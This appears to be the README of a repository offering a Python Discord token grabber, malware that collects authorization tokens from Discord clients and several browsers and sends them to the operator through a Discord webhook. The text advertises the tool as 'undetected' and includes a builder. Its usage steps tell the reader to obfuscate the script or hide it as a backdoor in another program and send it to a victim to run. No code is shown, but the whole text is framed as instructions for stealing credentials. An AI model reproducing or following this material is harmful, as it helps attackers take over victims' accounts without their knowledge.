<p align="center">A Discord token grabber written in Python 3.</p>

This version of the grabber is undetected and has a builder. Just run builder.py and it will tell you the rest

# Features
 - No local caching
 - Transfers via Discord webhook
 - Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
 - No external Python modules required
 - \[**todo**\] Cross-platform support

<br>

# How to use
 1. Create a webhook on your Discord server. I recommend creating a new server.
 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
 3. *(obfuscate the code or install it as a backdoor in an other script.)*
 4. Send the script to your victim and make them run it.
